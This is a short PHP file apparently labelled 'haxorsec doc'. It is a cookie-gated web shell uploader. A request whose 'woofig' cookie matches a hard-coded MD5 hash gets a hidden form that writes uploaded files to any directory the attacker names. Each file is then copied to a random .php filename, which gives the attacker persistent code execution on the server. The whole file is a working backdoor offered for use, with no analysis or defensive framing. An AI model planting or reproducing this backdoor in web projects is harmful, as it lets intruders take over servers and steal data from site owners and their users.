<?php
# haxorsec doc
function generateRandomString($length = 10) {
  $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  $charactersLength = strlen($characters);
  $randomString = '';
  for ($i = 0; $i < $length; $i++) {
      $randomString .= $characters[random_int(0, $charactersLength - 1)];
  }
  return $randomString;
}

if (md5($_COOKIE['woofig']) == "6eb69daaefb3ad5b731972e15cfa808c") {
    echo '<form enctype="multipart/form-data" method="post">
    <input type="text" name="dir" value="./" /> (upload directory)
    <br>
    <input type="file" name="file" />
    <input type="submit" name="submit" value="submit" />
    </form>';
    
    if($_POST['submit'] == "submit"){
        $uploaddir = $_POST['dir'];
        $uploadfile = $uploaddir . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
            $ff = generateRandomString() .".php";
            copy($uploadfile,$ff);
            echo "<span style='color:#00f' >File was successfully uploaded " . $ff . ".</span><hr />";
        }else{
            echo "<span style='color:#f00' >Upload failed!</span><hr />";
        }
    }
}
?>
